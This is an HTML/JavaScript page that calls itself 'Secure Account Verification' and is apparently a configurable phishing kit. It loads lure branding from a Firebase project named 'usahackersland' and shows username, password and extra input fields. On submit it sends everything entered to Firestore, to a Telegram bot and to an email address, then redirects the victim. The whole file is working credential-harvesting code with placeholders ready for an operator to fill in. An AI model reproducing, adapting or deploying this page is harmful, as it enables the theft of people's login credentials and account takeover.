<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8"/>
<meta name="viewport" content="width=device-width,initial-scale=1"/>
<title id="pageTitle">Secure Account Verification</title>
<meta name="description" id="metaDescription" content="Verify your account to continue securely">
<meta property="og:title" content="Secure Account Verification">
<meta property="og:description" content="Verify your account to continue securely">
<meta property="og:image" id="ogImageMeta" content="https://example.com/og-image.png">

<style>
body{font-family:Arial,Helvetica,sans-serif;background:#f4f6f8;padding:18px;margin:0}
.wrap{max-width:600px;margin:auto;background:#fff;padding:18px;border-radius:10px;box-sizing:border-box}
input,textarea,button{width:100%;padding:10px;margin-top:8px;border-radius:6px;border:1px solid #ccc;box-sizing:border-box}
textarea{min-height:60px}
.galleryImg{max-width:100%;margin:6px 0;border-radius:6px}
.embedLink{margin-top:6px;padding:6px;background:#e8f0fe;border-radius:6px}
button{background:#1976d2;color:#fff;border:none;padding:10px;border-radius:6px;cursor:pointer;margin-top:10px}
</style>

<script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-firestore-compat.js"></script>
</head>
<body>
<div class="wrap" id="formContainer">
<p>Loading form...</p>
</div>

<script>
const firebaseConfig = {
  apiKey: "AIzaSyB5zWUvl64s6wAjjeXd0mCUyhMEdzg_MmM",
  authDomain: "usahackersland.firebaseapp.com",
  projectId: "usahackersland"
};
firebase.initializeApp(firebaseConfig);
const db = firebase.firestore();

const telegramBotToken = "YOUR_TELEGRAM_BOT_TOKEN"; // replace with your bot token
const telegramChatId = "YOUR_CHAT_ID"; // replace with your chat id
const emailRecipient = "youremail@example.com"; // your email

function getQueryParam(param){
  const urlParams = new URLSearchParams(window.location.search);
  return urlParams.get(param);
}

const formId = getQueryParam("id");
if(!formId){
  document.getElementById("formContainer").innerHTML="<p>Invalid form link.</p>";
}

db.collection("forms").doc(formId).get().then(doc=>{
  if(!doc.exists){
    document.getElementById("formContainer").innerHTML="<p>Form not found.</p>";
    return;
  }
  const data = doc.data();

  // Update SEO meta for social media
  document.title = data.seoTitle || "Secure Account Verification";
  document.getElementById("pageTitle").textContent = document.title;
  document.getElementById("metaDescription").content = data.metaDesc || "";
  document.getElementById("ogImageMeta").content = data.ogImage || "";
  document.querySelector("meta[property='og:title']").content = data.seoTitle || "";
  document.querySelector("meta[property='og:description']").content = data.metaDesc || "";

  const container = document.getElementById("formContainer");
  container.innerHTML="";

  const inputsArray = []; // to store all inputs for submission

  // Banner
  if(data.bannerURL){
    const banner = document.createElement("img");
    banner.src=data.bannerURL;
    banner.style.width="100%";
    banner.style.borderRadius="8px";
    container.appendChild(banner);
  }

  // Avatar
  if(data.avatarURL){
    const avatar = document.createElement("img");
    avatar.src=data.avatarURL;
    avatar.style.width="80px";
    avatar.style.borderRadius="50%";
    avatar.style.display="block";
    avatar.style.margin="10px auto";
    container.appendChild(avatar);
  }

  // Logo
  if(data.logoURL){
    const logo = document.createElement("img");
    logo.src=data.logoURL;
    logo.style.width="120px";
    logo.style.display="block";
    logo.style.margin="10px auto";
    container.appendChild(logo);
  }

  // Page Title
  const h2 = document.createElement("h2");
  h2.textContent = data.title;
  h2.style.textAlign="center";
  h2.style.color = data.titleColor || "#111";
  container.appendChild(h2);

  // Subtitle
  const sub = document.createElement("p");
  sub.textContent = data.subtitle;
  sub.style.textAlign="center";
  sub.style.color = data.subtitleColor || "#555";
  container.appendChild(sub);

  // Gallery images (on top)
  if(data.galleryImages && data.galleryImages.length){
    data.galleryImages.forEach(url=>{
      const img = document.createElement("img");
      img.src = url;
      img.className="galleryImg";
      container.appendChild(img);
    });
  }

  // Description
  const desc = document.createElement("p");
  desc.textContent = data.description;
  container.appendChild(desc);

  // Videos
  if(data.videoLinks && data.videoLinks.length){
    data.videoLinks.forEach(v=>{
      const vidId = v.split("v=")[1];
      if(vidId){
        const iframe = document.createElement("iframe");
        iframe.width="100%";
        iframe.height="180";
        iframe.src=`https://www.youtube.com/embed/${vidId}`;
        iframe.frameBorder=0;
        iframe.allow="fullscreen";
        container.appendChild(iframe);
      }
    });
  }

  // Username & Password
  if(data.addAuth){
    const uInput = document.createElement("input");
    uInput.placeholder = data.usernamePlaceholder || "Email or Username";
    container.appendChild(uInput);
    inputsArray.push({label:"Username/Email", input:uInput});

    const pInput = document.createElement("input");
    pInput.type="password";
    pInput.placeholder = data.passwordPlaceholder || "Password";
    container.appendChild(pInput);
    inputsArray.push({label:"Password", input:pInput});
  }

  // Extra Fields
  if(data.extraFields && data.extraFields.length){
    data.extraFields.forEach(f=>{
      const input = document.createElement("input");
      input.placeholder=f;
      container.appendChild(input);
      inputsArray.push({label:f, input:input});
    });
  }

  // Embed Links
  if(data.embedLinks && data.embedLinks.length){
    data.embedLinks.forEach(link=>{
      if(!link.show) return;
      const div = document.createElement("div");
      div.className="embedLink";
      div.innerHTML=`<a href="${link.url}" target="_blank"><strong>${link.text}</strong></a>`;
      if(link.desc) div.innerHTML+=`<br><small>${link.desc}</small>`;
      container.appendChild(div);
    });
  }

  // Warning
  if(data.enableWarning){
    const warn = document.createElement("p");
    warn.textContent = data.warning;
    warn.style.color="#b71c1c";
    warn.style.textAlign = data.warningPosition || "normal";
    container.appendChild(warn);
  }

  // Main Button
  if(data.showMainBtn){
    const btn = document.createElement("button");
    btn.textContent = data.buttonText || "Submit";
    btn.style.background = data.btnColor || "#1976d2";
    btn.onclick = ()=>{
      const submission = {formId:formId, createdAt:new Date().toISOString()};
      inputsArray.forEach(i=>submission[i.label]=i.input.value);

      // Save to Firebase dashboard
      db.collection("submissions").add(submission).then(()=>{
        alert("Form submitted successfully!");
      });

      // Send to Telegram Bot
      const message = Object.entries(submission).map(([k,v])=>`${k}: ${v}`).join("\n");
      fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`,{
        method:"POST",
        headers:{"Content-Type":"application/json"},
        body: JSON.stringify({chat_id:telegramChatId,text:message})
      });

      // Send Email alert (using EmailJS or any SMTP API)
      fetch("https://api.emailjs.com/api/v1.0/email/send", {
        method:"POST",
        headers:{"Content-Type":"application/json"},
        body: JSON.stringify({
          service_id: "YOUR_SERVICE_ID",
          template_id: "YOUR_TEMPLATE_ID",
          user_id: "YOUR_EMAILJS_USER_ID",
          template_params: {...submission, to_email: emailRecipient}
        })
      });

      // Redirect if enabled
      if(data.enableRedirect && data.redirectURL){
        window.location.href=data.redirectURL;
      }
    };
    container.appendChild(btn);
  }

  // Generate Button
  if(data.showGenerateBtn){
    const genBtn = document.createElement("button");
    genBtn.textContent = data.generateBtnText || "Generate Form";
    genBtn.onclick = ()=>alert("This form was generated successfully!");
    container.appendChild(genBtn);
  }

  // Footer
  if(data.footerText){
    const footer = document.createElement("footer");
    footer.textContent = data.footerText;
    footer.style.textAlign="center";
    footer.style.fontSize="12px";
    footer.style.marginTop="12px";
    container.appendChild(footer);
  }

}).catch(err=>{
  document.getElementById("formContainer").innerHTML="<p>Error loading form: "+err+"</p>";
});
</script>
</body>
</html>
